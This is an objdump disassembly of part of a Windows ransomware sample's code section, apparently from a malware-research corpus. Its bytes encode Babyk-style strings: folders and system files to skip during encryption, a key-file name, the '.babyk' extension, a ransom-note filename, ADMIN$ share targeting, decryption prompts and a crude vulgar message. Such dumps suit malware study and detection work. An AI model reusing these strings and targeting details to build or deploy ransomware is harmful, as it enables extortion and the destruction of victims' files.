
malware_samples/ransomware/09175b12be9491968e6d9f8878a634156075da518a31f416956fbd0c50fa36d0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	90                   	nop
   140001001:	b0 00                	mov    $0x0,%al
   140001003:	40 01 00             	rex add %eax,(%rax)
   140001006:	00 00                	add    %al,(%rax)
   140001008:	30 b1 00 40 01 00    	xor    %dh,0x14000(%rcx)
   14000100e:	00 00                	add    %al,(%rax)
   140001010:	57                   	push   %rdi
   140001011:	00 69 00             	add    %ch,0x0(%rcx)
   140001014:	6e                   	outsb  (%rsi),(%dx)
   140001015:	00 64 00 6f          	add    %ah,0x6f(%rax,%rax,1)
   140001019:	00 77 00             	add    %dh,0x0(%rdi)
   14000101c:	73 00                	jae    0x14000101e
   14000101e:	00 00                	add    %al,(%rax)
   140001020:	57                   	push   %rdi
   140001021:	00 69 00             	add    %ch,0x0(%rcx)
   140001024:	6e                   	outsb  (%rsi),(%dx)
   140001025:	00 64 00 6f          	add    %ah,0x6f(%rax,%rax,1)
   140001029:	00 77 00             	add    %dh,0x0(%rdi)
   14000102c:	73 00                	jae    0x14000102e
   14000102e:	2e 00 6f 00          	cs add %ch,0x0(%rdi)
   140001032:	6c                   	insb   (%dx),(%rdi)
   140001033:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   140001037:	00 54 00 6f          	add    %dl,0x6f(%rax,%rax,1)
   14000103b:	00 72 00             	add    %dh,0x0(%rdx)
   14000103e:	20 00                	and    %al,(%rax)
   140001040:	42 00 72 00          	rex.X add %sil,0x0(%rdx)
   140001044:	6f                   	outsl  (%rsi),(%dx)
   140001045:	00 77 00             	add    %dh,0x0(%rdi)
   140001048:	73 00                	jae    0x14000104a
   14000104a:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000104e:	00 00                	add    %al,(%rax)
   140001050:	49 00 6e 00          	rex.WB add %bpl,0x0(%r14)
   140001054:	74 00                	je     0x140001056
   140001056:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000105a:	6e                   	outsb  (%rsi),(%dx)
   14000105b:	00 65 00             	add    %ah,0x0(%rbp)
   14000105e:	74 00                	je     0x140001060
   140001060:	20 00                	and    %al,(%rax)
   140001062:	45 00 78 00          	add    %r15b,0x0(%r8)
   140001066:	70 00                	jo     0x140001068
   140001068:	6c                   	insb   (%dx),(%rdi)
   140001069:	00 6f 00             	add    %ch,0x0(%rdi)
   14000106c:	72 00                	jb     0x14000106e
   14000106e:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140001072:	00 00                	add    %al,(%rax)
   140001074:	00 00                	add    %al,(%rax)
   140001076:	00 00                	add    %al,(%rax)
   140001078:	47 00 6f 00          	rex.RXB add %r13b,0x0(%r15)
   14000107c:	6f                   	outsl  (%rsi),(%dx)
   14000107d:	00 67 00             	add    %ah,0x0(%rdi)
   140001080:	6c                   	insb   (%dx),(%rdi)
   140001081:	00 65 00             	add    %ah,0x0(%rbp)
   140001084:	00 00                	add    %al,(%rax)
   140001086:	00 00                	add    %al,(%rax)
   140001088:	4f 00 70 00          	rex.WRXB add %r14b,0x0(%r8)
   14000108c:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140001090:	61                   	(bad)
   140001091:	00 00                	add    %al,(%rax)
   140001093:	00 00                	add    %al,(%rax)
   140001095:	00 00                	add    %al,(%rax)
   140001097:	00 4f 00             	add    %cl,0x0(%rdi)
   14000109a:	70 00                	jo     0x14000109c
   14000109c:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   1400010a0:	61                   	(bad)
   1400010a1:	00 20                	add    %ah,(%rax)
   1400010a3:	00 53 00             	add    %dl,0x0(%rbx)
   1400010a6:	6f                   	outsl  (%rsi),(%dx)
   1400010a7:	00 66 00             	add    %ah,0x0(%rsi)
   1400010aa:	74 00                	je     0x1400010ac
   1400010ac:	77 00                	ja     0x1400010ae
   1400010ae:	61                   	(bad)
   1400010af:	00 72 00             	add    %dh,0x0(%rdx)
   1400010b2:	65 00 00             	add    %al,%gs:(%rax)
   1400010b5:	00 00                	add    %al,(%rax)
   1400010b7:	00 4d 00             	add    %cl,0x0(%rbp)
   1400010ba:	6f                   	outsl  (%rsi),(%dx)
   1400010bb:	00 7a 00             	add    %bh,0x0(%rdx)
   1400010be:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%rax),%eax
   1400010c4:	61                   	(bad)
   1400010c5:	00 00                	add    %al,(%rax)
   1400010c7:	00 4d 00             	add    %cl,0x0(%rbp)
   1400010ca:	6f                   	outsl  (%rsi),(%dx)
   1400010cb:	00 7a 00             	add    %bh,0x0(%rdx)
   1400010ce:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%rax),%eax
   1400010d4:	61                   	(bad)
   1400010d5:	00 20                	add    %ah,(%rax)
   1400010d7:	00 46 00             	add    %al,0x0(%rsi)
   1400010da:	69 00 72 00 65 00    	imul   $0x650072,(%rax),%eax
   1400010e0:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   1400010e4:	78 00                	js     0x1400010e6
   1400010e6:	00 00                	add    %al,(%rax)
   1400010e8:	24 00                	and    $0x0,%al
   1400010ea:	52                   	push   %rdx
   1400010eb:	00 65 00             	add    %ah,0x0(%rbp)
   1400010ee:	63 00                	movsxd (%rax),%eax
   1400010f0:	79 00                	jns    0x1400010f2
   1400010f2:	63 00                	movsxd (%rax),%eax
   1400010f4:	6c                   	insb   (%dx),(%rdi)
   1400010f5:	00 65 00             	add    %ah,0x0(%rbp)
   1400010f8:	2e 00 42 00          	cs add %al,0x0(%rdx)
   1400010fc:	69 00 6e 00 00 00    	imul   $0x6e,(%rax),%eax
   140001102:	00 00                	add    %al,(%rax)
   140001104:	00 00                	add    %al,(%rax)
   140001106:	00 00                	add    %al,(%rax)
   140001108:	50                   	push   %rax
   140001109:	00 72 00             	add    %dh,0x0(%rdx)
   14000110c:	6f                   	outsl  (%rsi),(%dx)
   14000110d:	00 67 00             	add    %ah,0x0(%rdi)
   140001110:	72 00                	jb     0x140001112
   140001112:	61                   	(bad)
   140001113:	00 6d 00             	add    %ch,0x0(%rbp)
   140001116:	44 00 61 00          	add    %r12b,0x0(%rcx)
   14000111a:	74 00                	je     0x14000111c
   14000111c:	61                   	(bad)
   14000111d:	00 00                	add    %al,(%rax)
   14000111f:	00 41 00             	add    %al,0x0(%rcx)
   140001122:	6c                   	insb   (%dx),(%rdi)
   140001123:	00 6c 00 20          	add    %ch,0x20(%rax,%rax,1)
   140001127:	00 55 00             	add    %dl,0x0(%rbp)
   14000112a:	73 00                	jae    0x14000112c
   14000112c:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140001130:	73 00                	jae    0x140001132
   140001132:	00 00                	add    %al,(%rax)
   140001134:	00 00                	add    %al,(%rax)
   140001136:	00 00                	add    %al,(%rax)
   140001138:	61                   	(bad)
   140001139:	00 75 00             	add    %dh,0x0(%rbp)
   14000113c:	74 00                	je     0x14000113e
   14000113e:	6f                   	outsl  (%rsi),(%dx)
   14000113f:	00 72 00             	add    %dh,0x0(%rdx)
   140001142:	75 00                	jne    0x140001144
   140001144:	6e                   	outsb  (%rsi),(%dx)
   140001145:	00 2e                	add    %ch,(%rsi)
   140001147:	00 69 00             	add    %ch,0x0(%rcx)
   14000114a:	6e                   	outsb  (%rsi),(%dx)
   14000114b:	00 66 00             	add    %ah,0x0(%rsi)
   14000114e:	00 00                	add    %al,(%rax)
   140001150:	62                   	(bad)
   140001151:	00 6f 00             	add    %ch,0x0(%rdi)
   140001154:	6f                   	outsl  (%rsi),(%dx)
   140001155:	00 74 00 2e          	add    %dh,0x2e(%rax,%rax,1)
   140001159:	00 69 00             	add    %ch,0x0(%rcx)
   14000115c:	6e                   	outsb  (%rsi),(%dx)
   14000115d:	00 69 00             	add    %ch,0x0(%rcx)
	...
   140001168:	62                   	(bad)
   140001169:	00 6f 00             	add    %ch,0x0(%rdi)
   14000116c:	6f                   	outsl  (%rsi),(%dx)
   14000116d:	00 74 00 66          	add    %dh,0x66(%rax,%rax,1)
   140001171:	00 6f 00             	add    %ch,0x0(%rdi)
   140001174:	6e                   	outsb  (%rsi),(%dx)
   140001175:	00 74 00 2e          	add    %dh,0x2e(%rax,%rax,1)
   140001179:	00 62 00             	add    %ah,0x0(%rdx)
   14000117c:	69 00 6e 00 00 00    	imul   $0x6e,(%rax),%eax
   140001182:	00 00                	add    %al,(%rax)
   140001184:	00 00                	add    %al,(%rax)
   140001186:	00 00                	add    %al,(%rax)
   140001188:	62                   	(bad)
   140001189:	00 6f 00             	add    %ch,0x0(%rdi)
   14000118c:	6f                   	outsl  (%rsi),(%dx)
   14000118d:	00 74 00 73          	add    %dh,0x73(%rax,%rax,1)
   140001191:	00 65 00             	add    %ah,0x0(%rbp)
   140001194:	63 00                	movsxd (%rax),%eax
   140001196:	74 00                	je     0x140001198
   140001198:	2e 00 62 00          	cs add %ah,0x0(%rdx)
   14000119c:	61                   	(bad)
   14000119d:	00 6b 00             	add    %ch,0x0(%rbx)
	...
   1400011a8:	62                   	(bad)
   1400011a9:	00 6f 00             	add    %ch,0x0(%rdi)
   1400011ac:	6f                   	outsl  (%rsi),(%dx)
   1400011ad:	00 74 00 6d          	add    %dh,0x6d(%rax,%rax,1)
   1400011b1:	00 67 00             	add    %ah,0x0(%rdi)
   1400011b4:	72 00                	jb     0x1400011b6
   1400011b6:	00 00                	add    %al,(%rax)
   1400011b8:	62                   	(bad)
   1400011b9:	00 6f 00             	add    %ch,0x0(%rdi)
   1400011bc:	6f                   	outsl  (%rsi),(%dx)
   1400011bd:	00 74 00 6d          	add    %dh,0x6d(%rax,%rax,1)
   1400011c1:	00 67 00             	add    %ah,0x0(%rdi)
   1400011c4:	72 00                	jb     0x1400011c6
   1400011c6:	2e 00 65 00          	cs add %ah,0x0(%rbp)
   1400011ca:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   1400011ce:	00 00                	add    %al,(%rax)
   1400011d0:	62                   	(bad)
   1400011d1:	00 6f 00             	add    %ch,0x0(%rdi)
   1400011d4:	6f                   	outsl  (%rsi),(%dx)
   1400011d5:	00 74 00 6d          	add    %dh,0x6d(%rax,%rax,1)
   1400011d9:	00 67 00             	add    %ah,0x0(%rdi)
   1400011dc:	66 00 77 00          	data16 add %dh,0x0(%rdi)
   1400011e0:	2e 00 65 00          	cs add %ah,0x0(%rbp)
   1400011e4:	66 00 69 00          	data16 add %ch,0x0(%rcx)
	...
   1400011f0:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   1400011f4:	73 00                	jae    0x1400011f6
   1400011f6:	6b 00 74             	imul   $0x74,(%rax),%eax
   1400011f9:	00 6f 00             	add    %ch,0x0(%rdi)
   1400011fc:	70 00                	jo     0x1400011fe
   1400011fe:	2e 00 69 00          	cs add %ch,0x0(%rcx)
   140001202:	6e                   	outsb  (%rsi),(%dx)
   140001203:	00 69 00             	add    %ch,0x0(%rcx)
   140001206:	00 00                	add    %al,(%rax)
   140001208:	69 00 63 00 6f 00    	imul   $0x6f0063,(%rax),%eax
   14000120e:	6e                   	outsb  (%rsi),(%dx)
   14000120f:	00 63 00             	add    %ah,0x0(%rbx)
   140001212:	61                   	(bad)
   140001213:	00 63 00             	add    %ah,0x0(%rbx)
   140001216:	68 00 65 00 2e       	push   $0x2e006500
   14000121b:	00 64 00 62          	add    %ah,0x62(%rax,%rax,1)
	...
   140001227:	00 6e 00             	add    %ch,0x0(%rsi)
   14000122a:	74 00                	je     0x14000122c
   14000122c:	6c                   	insb   (%dx),(%rdi)
   14000122d:	00 64 00 72          	add    %ah,0x72(%rax,%rax,1)
   140001231:	00 00                	add    %al,(%rax)
   140001233:	00 00                	add    %al,(%rax)
   140001235:	00 00                	add    %al,(%rax)
   140001237:	00 6e 00             	add    %ch,0x0(%rsi)
   14000123a:	74 00                	je     0x14000123c
   14000123c:	75 00                	jne    0x14000123e
   14000123e:	73 00                	jae    0x140001240
   140001240:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140001244:	2e 00 64 00 61       	cs add %ah,0x61(%rax,%rax,1)
   140001249:	00 74 00 00          	add    %dh,0x0(%rax,%rax,1)
   14000124d:	00 00                	add    %al,(%rax)
   14000124f:	00 6e 00             	add    %ch,0x0(%rsi)
   140001252:	74 00                	je     0x140001254
   140001254:	75 00                	jne    0x140001256
   140001256:	73 00                	jae    0x140001258
   140001258:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000125c:	2e 00 64 00 61       	cs add %ah,0x61(%rax,%rax,1)
   140001261:	00 74 00 2e          	add    %dh,0x2e(%rax,%rax,1)
   140001265:	00 6c 00 6f          	add    %ch,0x6f(%rax,%rax,1)
   140001269:	00 67 00             	add    %ah,0x0(%rdi)
   14000126c:	00 00                	add    %al,(%rax)
   14000126e:	00 00                	add    %al,(%rax)
   140001270:	6e                   	outsb  (%rsi),(%dx)
   140001271:	00 74 00 75          	add    %dh,0x75(%rax,%rax,1)
   140001275:	00 73 00             	add    %dh,0x0(%rbx)
   140001278:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000127c:	2e 00 69 00          	cs add %ch,0x0(%rcx)
   140001280:	6e                   	outsb  (%rsi),(%dx)
   140001281:	00 69 00             	add    %ch,0x0(%rcx)
   140001284:	00 00                	add    %al,(%rax)
   140001286:	00 00                	add    %al,(%rax)
   140001288:	74 00                	je     0x14000128a
   14000128a:	68 00 75 00 6d       	push   $0x6d007500
   14000128f:	00 62 00             	add    %ah,0x0(%rdx)
   140001292:	73 00                	jae    0x140001294
   140001294:	2e 00 64 00 62       	cs add %ah,0x62(%rax,%rax,1)
   140001299:	00 00                	add    %al,(%rax)
   14000129b:	00 00                	add    %al,(%rax)
   14000129d:	00 00                	add    %al,(%rax)
   14000129f:	00 65 00             	add    %ah,0x0(%rbp)
   1400012a2:	63 00                	movsxd (%rax),%eax
   1400012a4:	64 00 68 00          	add    %ch,%fs:0x0(%rax)
   1400012a8:	5f                   	pop    %rdi
   1400012a9:	00 70 00             	add    %dh,0x0(%rax)
   1400012ac:	75 00                	jne    0x1400012ae
   1400012ae:	62                   	(bad)
   1400012af:	00 5f 00             	add    %bl,0x0(%rdi)
   1400012b2:	6b 00 2e             	imul   $0x2e,(%rax),%eax
   1400012b5:	00 62 00             	add    %ah,0x0(%rdx)
   1400012b8:	69 00 6e 00 00 00    	imul   $0x6e,(%rax),%eax
   1400012be:	00 00                	add    %al,(%rax)
   1400012c0:	50                   	push   %rax
   1400012c1:	00 72 00             	add    %dh,0x0(%rdx)
   1400012c4:	6f                   	outsl  (%rsi),(%dx)
   1400012c5:	00 67 00             	add    %ah,0x0(%rdi)
   1400012c8:	72 00                	jb     0x1400012ca
   1400012ca:	61                   	(bad)
   1400012cb:	00 6d 00             	add    %ch,0x0(%rbp)
   1400012ce:	20 00                	and    %al,(%rax)
   1400012d0:	46 00 69 00          	rex.RX add %r13b,0x0(%rcx)
   1400012d4:	6c                   	insb   (%dx),(%rdi)
   1400012d5:	00 65 00             	add    %ah,0x0(%rbp)
   1400012d8:	73 00                	jae    0x1400012da
   1400012da:	00 00                	add    %al,(%rax)
   1400012dc:	00 00                	add    %al,(%rax)
   1400012de:	00 00                	add    %al,(%rax)
   1400012e0:	50                   	push   %rax
   1400012e1:	00 72 00             	add    %dh,0x0(%rdx)
   1400012e4:	6f                   	outsl  (%rsi),(%dx)
   1400012e5:	00 67 00             	add    %ah,0x0(%rdi)
   1400012e8:	72 00                	jb     0x1400012ea
   1400012ea:	61                   	(bad)
   1400012eb:	00 6d 00             	add    %ch,0x0(%rbp)
   1400012ee:	20 00                	and    %al,(%rax)
   1400012f0:	46 00 69 00          	rex.RX add %r13b,0x0(%rcx)
   1400012f4:	6c                   	insb   (%dx),(%rdi)
   1400012f5:	00 65 00             	add    %ah,0x0(%rbp)
   1400012f8:	73 00                	jae    0x1400012fa
   1400012fa:	20 00                	and    %al,(%rax)
   1400012fc:	28 00                	sub    %al,(%rax)
   1400012fe:	78 00                	js     0x140001300
   140001300:	38 00                	cmp    %al,(%rax)
   140001302:	36 00 29             	ss add %ch,(%rcx)
   140001305:	00 00                	add    %al,(%rax)
   140001307:	00 2e                	add    %ch,(%rsi)
   140001309:	00 2e                	add    %ch,(%rsi)
   14000130b:	00 00                	add    %al,(%rax)
   14000130d:	00 00                	add    %al,(%rax)
   14000130f:	00 2e                	add    %ch,(%rsi)
   140001311:	00 00                	add    %al,(%rax)
   140001313:	00 00                	add    %al,(%rax)
   140001315:	00 00                	add    %al,(%rax)
   140001317:	00 4b 00             	add    %cl,0x0(%rbx)
   14000131a:	65 00 79 00          	add    %bh,%gs:0x0(%rcx)
   14000131e:	20 00                	and    %al,(%rax)
   140001320:	62                   	(bad)
   140001321:	00 72 00             	add    %dh,0x0(%rdx)
   140001324:	6f                   	outsl  (%rsi),(%dx)
   140001325:	00 6b 00             	add    %ch,0x0(%rbx)
   140001328:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   14000132c:	21 00                	and    %eax,(%rax)
   14000132e:	00 00                	add    %al,(%rax)
   140001330:	5c                   	pop    %rsp
   140001331:	00 2a                	add    %ch,(%rdx)
   140001333:	00 00                	add    %al,(%rax)
   140001335:	00 00                	add    %al,(%rax)
   140001337:	00 5c 00 00          	add    %bl,0x0(%rax,%rax,1)
   14000133b:	00 00                	add    %al,(%rax)
   14000133d:	00 00                	add    %al,(%rax)
   14000133f:	00 2e                	add    %ch,(%rsi)
   140001341:	00 62 00             	add    %ah,0x0(%rdx)
   140001344:	61                   	(bad)
   140001345:	00 62 00             	add    %ah,0x0(%rdx)
   140001348:	79 00                	jns    0x14000134a
   14000134a:	6b 00 00             	imul   $0x0,(%rax),%eax
   14000134d:	00 00                	add    %al,(%rax)
   14000134f:	00 5c 00 48          	add    %bl,0x48(%rax,%rax,1)
   140001353:	00 6f 00             	add    %ch,0x0(%rdi)
   140001356:	77 00                	ja     0x140001358
   140001358:	20 00                	and    %al,(%rax)
   14000135a:	54                   	push   %rsp
   14000135b:	00 6f 00             	add    %ch,0x0(%rdi)
   14000135e:	20 00                	and    %al,(%rax)
   140001360:	52                   	push   %rdx
   140001361:	00 65 00             	add    %ah,0x0(%rbp)
   140001364:	73 00                	jae    0x140001366
   140001366:	74 00                	je     0x140001368
   140001368:	6f                   	outsl  (%rsi),(%dx)
   140001369:	00 72 00             	add    %dh,0x0(%rdx)
   14000136c:	65 00 20             	add    %ah,%gs:(%rax)
   14000136f:	00 59 00             	add    %bl,0x0(%rcx)
   140001372:	6f                   	outsl  (%rsi),(%dx)
   140001373:	00 75 00             	add    %dh,0x0(%rbp)
   140001376:	72 00                	jb     0x140001378
   140001378:	20 00                	and    %al,(%rax)
   14000137a:	46 00 69 00          	rex.RX add %r13b,0x0(%rcx)
   14000137e:	6c                   	insb   (%dx),(%rdi)
   14000137f:	00 65 00             	add    %ah,0x0(%rbp)
   140001382:	73 00                	jae    0x140001384
   140001384:	2e 00 74 00 78       	cs add %dh,0x78(%rax,%rax,1)
   140001389:	00 74 00 00          	add    %dh,0x0(%rax,%rax,1)
   14000138d:	00 00                	add    %al,(%rax)
   14000138f:	00 41 00             	add    %al,0x0(%rcx)
   140001392:	44 00 4d 00          	add    %r9b,0x0(%rbp)
   140001396:	49 00 4e 00          	rex.WB add %cl,0x0(%r14)
   14000139a:	24 00                	and    $0x0,%al
   14000139c:	00 00                	add    %al,(%rax)
   14000139e:	00 00                	add    %al,(%rax)
   1400013a0:	5c                   	pop    %rsp
   1400013a1:	00 5c 00 00          	add    %bl,0x0(%rax,%rax,1)
   1400013a5:	00 00                	add    %al,(%rax)
   1400013a7:	00 50 72             	add    %dl,0x72(%rax)
   1400013aa:	65 73 73             	gs jae 0x140001420
   1400013ad:	20 27                	and    %ah,(%rdi)
   1400013af:	4f                   	rex.WRXB
   1400013b0:	4b 27                	rex.WXB (bad)
   1400013b2:	20 74 6f 20          	and    %dh,0x20(%rdi,%rbp,2)
   1400013b6:	73 74                	jae    0x14000142c
   1400013b8:	61                   	(bad)
   1400013b9:	72 74                	jb     0x14000142f
   1400013bb:	20 64 65 63          	and    %ah,0x63(%rbp,%riz,2)
   1400013bf:	72 79                	jb     0x14000143a
   1400013c1:	70 74                	jo     0x140001437
   1400013c3:	69 6f 6e 20 70 72 6f 	imul   $0x6f727020,0x6e(%rdi),%ebp
   1400013ca:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400013cd:	73 21                	jae    0x1400013f0
   1400013cf:	00 44 6f 59          	add    %al,0x59(%rdi,%rbp,2)
   1400013d3:	6f                   	outsl  (%rsi),(%dx)
   1400013d4:	75 57                	jne    0x14000142d
   1400013d6:	61                   	(bad)
   1400013d7:	6e                   	outsb  (%rsi),(%dx)
   1400013d8:	74 54                	je     0x14000142e
   1400013da:	6f                   	outsl  (%rsi),(%dx)
   1400013db:	48 61                	rex.W (bad)
   1400013dd:	76 65                	jbe    0x140001444
   1400013df:	53                   	push   %rbx
   1400013e0:	65 78 57             	gs js  0x14000143a
   1400013e3:	69 74 68 43 6f 75 6e 	imul   $0x676e756f,0x43(%rax,%rbp,2),%esi
   1400013ea:	67 
   1400013eb:	44 6f                	rex.R outsl (%rsi),(%dx)
   1400013ed:	6e                   	outsb  (%rsi),(%dx)
   1400013ee:	67 00 74 00 65       	add    %dh,0x65(%eax,%eax,1)
   1400013f3:	00 73 00             	add    %dh,0x0(%rbx)
   1400013f6:	74 00                	je     0x1400013f8
   1400013f8:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   1400013fc:	6c                   	insb   (%dx),(%rdi)
   1400013fd:	00 65 00             	add    %ah,0x0(%rbp)
	...
   140001408:	6c                   	insb   (%dx),(%rdi)
   140001409:	00 61 00             	add    %ah,0x0(%rcx)
   14000140c:	6e                   	outsb  (%rsi),(%dx)
   14000140d:	00 00                	add    %al,(%rax)
   14000140f:	00 73 00             	add    %dh,0x0(%rbx)
   140001412:	68 00 61 00 72       	push   $0x72006100
   140001417:	00 65 00             	add    %ah,0x0(%rbp)
   14000141a:	73 00                	jae    0x14000141c
   14000141c:	00 00                	add    %al,(%rax)
   14000141e:	00 00                	add    %al,(%rax)
   140001420:	70 00                	jo     0x140001422
   140001422:	61                   	(bad)
   140001423:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140001427:	00 73 00             	add    %dh,0x0(%rbx)
   14000142a:	00 00                	add    %al,(%rax)
   14000142c:	00 00                	add    %al,(%rax)
   14000142e:	00 00                	add    %al,(%rax)
   140001430:	62                   	(bad)
   140001431:	00 65 00             	add    %ah,0x0(%rbp)
   140001434:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   140001438:	72 00                	jb     0x14000143a
   14000143a:	65 00 00             	add    %al,%gs:(%rax)
   14000143d:	00 00                	add    %al,(%rax)
   14000143f:	00 5c 00 5c          	add    %bl,0x5c(%rax,%rax,1)
   140001443:	00 3f                	add    %bh,(%rdi)
   140001445:	00 5c 00 00          	add    %bl,0x0(%rax,%rax,1)
   140001449:	00 00                	add    %al,(%rax)
   14000144b:	00 3a                	add    %bh,(%rdx)
   14000144d:	00 00                	add    %al,(%rax)
   14000144f:	00 61 00             	add    %ah,0x0(%rcx)
   140001452:	66 00 74 00 65       	data16 add %dh,0x65(%rax,%rax,1)
   140001457:	00 72 00             	add    %dh,0x0(%rdx)
   14000145a:	00 00                	add    %al,(%rax)
   14000145c:	00 00                	add    %al,(%rax)
   14000145e:	00 00                	add    %al,(%rax)
   140001460:	59                   	pop    %rcx
   140001461:	6f                   	outsl  (%rsi),(%dx)
   140001462:	75 72                	jne    0x1400014d6
   140001464:	20 66 69             	and    %ah,0x69(%rsi)
   140001467:	6c                   	insb   (%dx),(%rdi)
   140001468:	65 73 20             	gs jae 0x14000148b
   14000146b:	64 65 63 72 79       	fs movsxd %gs:0x79(%rdx),%esi
   140001470:	70 74                	jo     0x1400014e6
   140001472:	65 64 2c 20          	gs fs sub $0x20,%al
   140001476:	62 79 65 21 00       	(bad)
   14000147b:	00 00                	add    %al,(%rax)
   14000147d:	00 00                	add    %al,(%rax)
   14000147f:	00 10                	add    %dl,(%rax)
   140001481:	10 00                	adc    %al,(%rax)
   140001483:	40 01 00             	rex add %eax,(%rax)
   140001486:	00 00                	add    %al,(%rax)
   140001488:	20 10                	and    %dl,(%rax)
   14000148a:	00 40 01             	add    %al,0x1(%rax)
   14000148d:	00 00                	add    %al,(%rax)
   14000148f:	00 38                	add    %bh,(%rax)
   140001491:	10 00                	adc    %al,(%rax)
   140001493:	40 01 00             	rex add %eax,(%rax)
   140001496:	00 00                	add    %al,(%rax)
   140001498:	50                   	push   %rax
   140001499:	10 00                	adc    %al,(%rax)
   14000149b:	40 01 00             	rex add %eax,(%rax)
   14000149e:	00 00                	add    %al,(%rax)
   1400014a0:	78 10                	js     0x1400014b2
   1400014a2:	00 40 01             	add    %al,0x1(%rax)
   1400014a5:	00 00                	add    %al,(%rax)
   1400014a7:	00 88 10 00 40 01    	add    %cl,0x1400010(%rax)
   1400014ad:	00 00                	add    %al,(%rax)
   1400014af:	00 98 10 00 40 01    	add    %bl,0x1400010(%rax)
   1400014b5:	00 00                	add    %al,(%rax)
   1400014b7:	00 b8 10 00 40 01    	add    %bh,0x1400010(%rax)
   1400014bd:	00 00                	add    %al,(%rax)
   1400014bf:	00 c8                	add    %cl,%al
   1400014c1:	10 00                	adc    %al,(%rax)
   1400014c3:	40 01 00             	rex add %eax,(%rax)
   1400014c6:	00 00                	add    %al,(%rax)
   1400014c8:	e8 10 00 40 01       	call   0x1414014dd
   1400014cd:	00 00                	add    %al,(%rax)
   1400014cf:	00 08                	add    %cl,(%rax)
   1400014d1:	11 00                	adc    %eax,(%rax)
   1400014d3:	40 01 00             	rex add %eax,(%rax)
   1400014d6:	00 00                	add    %al,(%rax)
   1400014d8:	20 11                	and    %dl,(%rcx)
   1400014da:	00 40 01             	add    %al,0x1(%rax)
   1400014dd:	00 00                	add    %al,(%rax)
   1400014df:	00 38                	add    %bh,(%rax)
   1400014e1:	11 00                	adc    %eax,(%rax)
   1400014e3:	40 01 00             	rex add %eax,(%rax)
   1400014e6:	00 00                	add    %al,(%rax)
   1400014e8:	50                   	push   %rax
   1400014e9:	11 00                	adc    %eax,(%rax)
   1400014eb:	40 01 00             	rex add %eax,(%rax)
   1400014ee:	00 00                	add    %al,(%rax)
   1400014f0:	68 11 00 40 01       	push   $0x1400011
   1400014f5:	00 00                	add    %al,(%rax)
   1400014f7:	00 88 11 00 40 01    	add    %cl,0x1400011(%rax)
   1400014fd:	00 00                	add    %al,(%rax)
   1400014ff:	00 a8 11 00 40 01    	add    %ch,0x1400011(%rax)
   140001505:	00 00                	add    %al,(%rax)
   140001507:	00 b8 11 00 40 01    	add    %bh,0x1400011(%rax)
   14000150d:	00 00                	add    %al,(%rax)
   14000150f:	00 d0                	add    %dl,%al
   140001511:	11 00                	adc    %eax,(%rax)
   140001513:	40 01 00             	rex add %eax,(%rax)
   140001516:	00 00                	add    %al,(%rax)
   140001518:	f0 11 00             	lock adc %eax,(%rax)
   14000151b:	40 01 00             	rex add %eax,(%rax)
   14000151e:	00 00                	add    %al,(%rax)
   140001520:	08 12                	or     %dl,(%rdx)
   140001522:	00 40 01             	add    %al,0x1(%rax)
   140001525:	00 00                	add    %al,(%rax)
   140001527:	00 28                	add    %ch,(%rax)
   140001529:	12 00                	adc    (%rax),%al
   14000152b:	40 01 00             	rex add %eax,(%rax)
   14000152e:	00 00                	add    %al,(%rax)
   140001530:	38 12                	cmp    %dl,(%rdx)
   140001532:	00 40 01             	add    %al,0x1(%rax)
   140001535:	00 00                	add    %al,(%rax)
   140001537:	00 50 12             	add    %dl,0x12(%rax)
   14000153a:	00 40 01             	add    %al,0x1(%rax)
   14000153d:	00 00                	add    %al,(%rax)
   14000153f:	00 70 12             	add    %dh,0x12(%rax)
   140001542:	00 40 01             	add    %al,0x1(%rax)
   140001545:	00 00                	add    %al,(%rax)
   140001547:	00 88 12 00 40 01    	add    %cl,0x1400012(%rax)
   14000154d:	00 00                	add    %al,(%rax)
   14000154f:	00 a0 12 00 40 01    	add    %ah,0x1400012(%rax)
   140001555:	00 00                	add    %al,(%rax)
   140001557:	00 c0                	add    %al,%al
   140001559:	12 00                	adc    (%rax),%al
   14000155b:	40 01 00             	rex add %eax,(%rax)
   14000155e:	00 00                	add    %al,(%rax)
   140001560:	e0 12                	loopne 0x140001574
   140001562:	00 40 01             	add    %al,0x1(%rax)
   140001565:	00 00                	add    %al,(%rax)
   140001567:	00 08                	add    %cl,(%rax)
   140001569:	13 00                	adc    (%rax),%eax
   14000156b:	40 01 00             	rex add %eax,(%rax)
   14000156e:	00 00                	add    %al,(%rax)
   140001570:	10 13                	adc    %dl,(%rbx)
   140001572:	00 40 01             	add    %al,0x1(%rax)
	...
   140001581:	00 00                	add    %al,(%rax)
   140001583:	00 b7 1d c1 04 6e    	add    %dh,0x6e04c11d(%rdi)
   140001589:	3b 82 09 d9 26 43    	cmp    0x4326d909(%rdx),%eax
   14000158f:	0d dc 76 04 13       	or     $0x130476dc,%eax
   140001594:	6b 6b c5 17          	imul   $0x17,-0x3b(%rbx),%ebp
   140001598:	b2 4d                	mov    $0x4d,%dl
   14000159a:	86 1a                	xchg   %bl,(%rdx)
   14000159c:	05 50 47 1e b8       	add    $0xb81e4750,%eax
   1400015a1:	ed                   	in     (%dx),%eax
   1400015a2:	08 26                	or     %ah,(%rsi)
   1400015a4:	0f f0                	(bad)
   1400015a6:	c9                   	leave
   1400015a7:	22 d6                	and    %dh,%dl
   1400015a9:	d6                   	udb
   1400015aa:	8a 2f                	mov    (%rdi),%ch
   1400015ac:	61                   	(bad)
